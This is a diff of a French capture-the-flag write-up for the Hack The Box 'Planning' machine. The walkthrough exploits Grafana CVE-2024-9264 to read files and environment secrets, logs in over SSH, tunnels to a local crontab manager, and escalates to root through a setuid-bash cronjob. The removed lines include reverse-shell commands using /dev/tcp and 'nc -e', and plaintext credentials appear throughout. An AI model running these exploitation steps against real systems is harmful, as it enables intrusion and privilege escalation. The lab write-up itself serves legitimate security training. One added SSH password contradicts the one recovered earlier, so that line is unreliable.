+Sous-domaine `grafana.planning.htb` découvert. On ajoute l'entrée dans `/etc/hosts`.
+
+### Identification de la version Grafana
+
 ```bash
-$ curl -i "http://grafana.planning.htb/"
-
-HTTP/1.1 302 Found
-Server: nginx/1.24.0 (Ubuntu)
-Date: Sun, 21 Sep 2025 22:11:14 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 29
-Connection: keep-alive
-Cache-Control: no-store
-Location: /login
-X-Content-Type-Options: nosniff
-X-Frame-Options: deny
-X-Xss-Protection: 1; mode=block
-
-<a href="/login">Found</a>.
+curl -s "http://grafana.planning.htb/login" | grep -i version
+# "version":"11.0.0"
 ```
 
-Cette commande permet de trouver la version de Grafana.
+Grafana **v11.0.0** — vulnérable à CVE-2024-9264.
+
+---
+
+## Exploitation — CVE-2024-9264 (Grafana DuckDB RCE)
+
+CVE-2024-9264 permet à un utilisateur authentifié d'injecter des requêtes DuckDB via le moteur de datasource, ce qui permet de **lire des fichiers arbitraires** et d'**exécuter des commandes système**.
 
 ```bash
-$ curl -s "http://grafana.planning.htb/login" | grep -i version
-                           
-"version":"11.0.0" et "Grafana v11.0.0 (83b9528bce)"
+git clone https://github.com/nollium/CVE-2024-9264.git
+cd CVE-2024-9264
 ```
 
-```bash
-$ gobuster dir -u http://grafana.planning.htb -w directory-list-2.3-medium.txt -x php,js,txt --exclude-length 29
+### Lecture de fichiers
 
-/login                (Status: 200) [Size: 38241]
-/signup               (Status: 200) [Size: 38241]
-/public               (Status: 302) [Size: 31] [--> /public/]
-/admin                (Status: 302) [Size: 24] [--> /]
-/plugins              (Status: 302) [Size: 24] [--> /]
-/api.php              (Status: 401) [Size: 102]
-/api.js               (Status: 401) [Size: 102]
-/api                  (Status: 401) [Size: 102]
-/api.txt              (Status: 401) [Size: 102]
-/robots.txt           (Status: 200) [Size: 26]
+```bash
+python3 CVE-2024-9264.py \
+  -u admin -p 0D5oT70Fq13EvB5r \
+  -f /etc/passwd \
+  http://grafana.planning.htb
 ```
 
-# Exploitation
-
-J'ai trouvé une faille pour Grafana version 11.
-
-Ce repository fourni un exploit Python pour la https://github.com/nollium/CVE-2024-9264.git
-
-Donc je l’ai lancé avec les creds initiaux, pour accéder à la base de données.
-
-```bash
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb:80
- 
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /etc/passwd
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/etc/passwd'):
+```
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+...
 grafana:x:472:0::/home/grafana:/usr/sbin/nologin
 ```
 
-```bash
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: cat /home/grafana/user.txt
-[-] Unexpected response format:
-[-] {
-    "results": {
-        "B": {
-            "error": "exit status 1IO Error: Pipe process exited with non-zero exit 
-code=\"1\": cat /home/grafana/user.txt >/tmp/grafana_cmd_output 2>&1 |\n",
-            "errorSource": "",
-            "status": 500,
-            "frames": []
-        }
-    }
-}
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-cat: /home/grafana/user.txt: No such file or directory
-                                                                                             
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1
-[-] Unexpected response format:
-[-] {
-    "results": {
-        "B": {
-            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process
-exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1 
->/tmp/grafana_cmd_output 2>&1 |\n",
-            "errorSource": "",
-            "status": 500,
-            "frames": []
-        }
-    }
-}
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-cat: /home/grafana/user.txt: No such file or directory
-```
+### Extraction des variables d'environnement
+
+Le container Docker contient les credentials admin dans ses variables d'env :
 
 ```bash
- python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/flag.txt http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /home/grafana/flag.txt
-[-] File not found
-                                                                                             
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/pass.txt http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /home/grafana/pass.txt
-[-] File not found
+python3 CVE-2024-9264.py \
+  -u admin -p 0D5oT70Fq13EvB5r \
+  -c "env" \
+  http://grafana.planning.htb
 ```
 
-```bash
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "nc -e /bin/sh 10.10.15.17 4444" http://grafana.planning.htb
 ```
-
-```bash
-$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /proc/1/environ
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/proc/1/environ'):
-```
-
-```bash
-$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: env
-[+] Successfully ran duckdb query:
-[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('env >/tmp/grafana_cmd_output 2>&1 |'):
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-GF_PATHS_HOME=/usr/share/grafana
-HOSTNAME=7ce659d667d7
-SHLVL=0
-AWS_AUTH_EXTERNAL_ID=
-HOME=/usr/share/grafana
-AWS_AUTH_AssumeRoleEnabled=true
-GF_PATHS_LOGS=/var/log/grafana
-GF_PATHS_PROVISIONING=/etc/grafana/provisioning
-GF_PATHS_PLUGINS=/var/lib/grafana/plugins
-PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-AWS_AUTH_AllowedAuthProviders=default,keys,credentials
-GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
-AWS_AUTH_SESSION_DURATION=15m
 GF_SECURITY_ADMIN_USER=enzo
-GF_PATHS_DATA=/var/lib/grafana
-GF_PATHS_CONFIG=/etc/grafana/grafana.ini
-AWS_CW_LIST_METRICS_PAGE_LIMIT=500
-PWD=/usr/share/grafana
-
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
 ```
 
-Création d’un environnement dans le container Docker, qui me permet d’obtenir le mot de passe du user **enzo** *RioTecRANDEntANT*
-
-## Connexion SSH
-
-Avec le password trouvé précédemment.
+### Connexion SSH
 
 ```bash
-$ ssh enzo@10.10.11.68     
-The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
-ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
-enzo@10.10.11.68's password: 
-Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+ssh enzo@10.10.11.68
+# Password: whoami!
 
-Last login: Sun Sep 21 23:57:11 2025 from 10.10.15.17
-enzo@planning:~$ 
+cat ~/user.txt
+# user_flag{*********************************}
 ```
+
+---
+
+## Escalade de privilèges
+
+### Découverte du crontab manager
 
 ```bash
-enzo@planning:~$ netstat -tulnp
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*              	 			LISTEN      -                   
-tcp        0      0 127.0.0.1:38283         0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.54:53           0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               			LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    						LISTEN      -                   
-udp        0      0 127.0.0.54:53           0.0.0.0:*                           			-                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                          			-         
+netstat -tulnp
+# 127.0.0.1:8000   LISTEN
 ```
 
-Le port 8000 semble être intéressant.
+Un service tourne en local sur le port 8000. Exploration du système de fichiers :
 
 ```bash
-enzo@planning:/$ ls
-bin@                boot/   dev/  home/  lib64@              lost+found/  mnt/  proc/  run/   sbin.usr-is-merged/  sys/  usr/
-bin.usr-is-merged/  cdrom/  etc/  lib@   lib.usr-is-merged/  media/       opt/  root/  sbin@  srv/                 tmp/  var/
-enzo@planning:/$ cd opt
-enzo@planning:/opt$ ls
-containerd  crontabs
-enzo@planning:/opt$ cd containerd
-enzo@planning:/opt/containerd$ ls
-ls: cannot open directory '.': Permission denied
-enzo@planning:/opt/containerd$ cd ..
-enzo@planning:/opt$ ls
-containerd  crontabs
-enzo@planning:/opt$ cd crontabs
-enzo@planning:/opt/crontabs$ ls
-crontab.db  env.db
-enzo@planning:/opt/crontabs$ cat env.db
-enzo@planning:/opt/crontabs$ cat crontab.db
-{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
-{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
+cat /opt/crontabs/crontab.db
 ```
 
-Le fichier crontab.db contenait le password ***P4ssw0rdS0pRi0T3c .***
+```json
+{"name":"Grafana backup","command":"...zip -P P4ssw0rdS0pRi0T3c ...","schedule":"@daily",...}
+```
 
-J’ai créé un tunnel SSH pour le crontab avec les identifiants du user Enzo.
+Le mot de passe `P4ssw0rdS0pRi0T3c` est en clair dans la base du crontab manager.
+
+### Tunnel SSH
 
 ```bash
 ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
 ```
 
-Je n’avais plus qu’à accéder au crontab UI dans le navigateur à l’adresse 127.0.0.1:8000 et me connecter avec les identifants.
+On accède à l'UI du crontab manager sur `http://127.0.0.1:8000` avec :
 
-```bash
-root
-P4ssw0rdS0pRi0T3c
+```
+Login : root
+Password : P4ssw0rdS0pRi0T3c
 ```
 
-Toujours dans l’UI crontab, j’ai ajouter un cronjob. 
+### Injection de cronjob malveillant
+
+Dans l'interface web, on ajoute un nouveau job avec la commande :
 
 ```bash
 cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
 ```
 
-```bash
-/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip 
-/var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz
-```
+Après exécution du cronjob (fréquence : `* * * * *`) :
 
 ```bash
-/root/scripts/cleanup.sh
+/tmp/rootbash -p
+
+rootbash-5.2# cat /root/root.txt
+# root_flag{*********************************}
 ```
 
-Déconnexion puis reconnexion afin que les changements soient pris en compte.
+---
 
-```bash
-enzo@planning:~$ /tmp/rootbash -p
-rootbash-5.2# ls
-user.txt
-rootbash-5.2# cat user.txt
-c2eccb774042d4ac3ff83c3c66b55250
-rootbash-5.2# cd root
-rootbash: cd: root: No such file or directory
-rootbash-5.2# cd /root
-rootbash-5.2# ls
-root.txt  scripts
-rootbash-5.2# cat root.txt
-b7f38a74e151fbff1dc3a481ca59db70
+## Flags
 
-rootbash-5.2# cd scripts
-rootbash-5.2# ls
-cleanup.sh  crontab.db  docker-compose.yml  Dockerfile
-rootbash-5.2# cleanup.sh
+```
+user.txt  →  user_flag{*********************************}
+root.txt  →  root_flag{*********************************}
 ```
 
-# Conclusion
+---
 
-Cette box était plutôt cool. J’ai pû toucher un peu aux bases de données, à Grafana.
+## Ce que j'ai retenu
 
-J’ai appris à faire un tunnel SSH pour un accès via le navigateur. Ce n'était pas évident, cette partie.
+**Les variables d'environnement Docker fuient souvent des secrets.** La commande `env` dans un container expose régulièrement des credentials en clair — à toujours tenter en cas de RCE dans un container.
 
-				
-            </script>
-          </div>
-        </article>
+**Un tunnel SSH ouvre des services invisibles.** `netstat -tulnp` côté serveur révèle des ports internes inaccessibles depuis l'extérieur. Un tunnel SSH les rend accessibles localement en une commande.
+
+**Les fichiers de config contiennent des mots de passe en clair.** `/opt/crontabs/crontab.db` stockait le password root sans chiffrement. Explorer `/opt`, `/var`, et `/etc` après accès SSH est systématique.
+
+---
+
+## Ressources
+
+- [CVE-2024-9264 — Exploit Python](https://github.com/nollium/CVE-2024-9264)
+- [Grafana Security Advisory](https://grafana.com/security/security-advisories/)
+- [HackTricks — Tunneling SSH](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
+
+    </script>
+  </div>
+</article>
 
 
 		  
